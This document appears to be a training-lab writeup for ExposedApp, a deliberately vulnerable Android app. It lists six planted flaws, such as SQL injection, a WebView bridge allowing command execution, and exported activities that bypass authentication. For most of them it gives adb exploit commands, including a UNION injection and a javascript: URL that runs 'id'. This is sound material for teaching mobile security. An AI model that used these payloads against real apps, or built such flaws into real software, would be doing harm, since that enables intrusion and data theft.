# ExposedApp — Vulnerability Documentation

## App Description
ExposedApp is a contacts/profile application that demonstrates **OWASP M1: Improper Platform Usage** vulnerabilities through dangerously exported Android components.

**Package:** `com.pentestlab.exposedapp`

---

## Planted Vulnerabilities

### 1. 🔴 CRITICAL — SQL Injection in Content Provider
- **File:** `UserContentProvider.java`
- **Description:** `query()` method uses raw string concatenation for SQL queries
- **Exploit:**
  ```bash
  # Dump all users
  adb shell content query --uri content://com.pentestlab.exposedapp.provider/users

  # SQL Injection
  adb shell content query --uri content://com.pentestlab.exposedapp.provider/users \
      --where "1=1) UNION SELECT 1,sqlite_version(),3,4,5,6--"
  ```

### 2. 🔴 CRITICAL — WebView JavaScript Interface RCE
- **File:** `InternalWebViewActivity.java`
- **Description:** `AndroidBridge` exposes `executeCommand()` and `readFile()` to JavaScript
- **Exploit:**
  ```bash
  adb shell am start -n com.pentestlab.exposedapp/.InternalWebViewActivity \
      --es url "javascript:void(document.write(AndroidBridge.executeCommand('id')))"
  ```

### 3. 🔴 HIGH — Exported Activities Bypass Authentication
- **Files:** `ProfileActivity.java`, `AdminActivity.java`
- **Description:** Both activities are `exported="true"` with no permission checks
- **Exploit:**
  ```bash
  # Access profile without login
  adb shell am start -n com.pentestlab.exposedapp/.ProfileActivity
  
  # Access admin panel without login
  adb shell am start -n com.pentestlab.exposedapp/.AdminActivity
  ```

### 4. 🔴 HIGH — Broadcast Receiver Data Leakage
- **File:** `DataBroadcastReceiver.java`, `LoginActivity.java`
- **Description:** Sensitive data (SSN, email, phone) sent via unprotected broadcast
- **Exploit:** Register a receiver for `com.pentestlab.exposedapp.USER_DATA` to intercept data

### 5. 🔴 HIGH — Deep Link Command Injection
- **File:** `DeepLinkActivity.java`
- **Description:** Processes commands from URL parameters without validation
- **Exploit:**
  ```bash
  adb shell am start -a android.intent.action.VIEW \
      -d "pentestlab://action?cmd=delete&data=all_users"
  ```

### 6. 🟡 MEDIUM — Content Provider No Permissions
- **File:** `AndroidManifest.xml`
- **Description:** Content provider exported without `readPermission`/`writePermission`
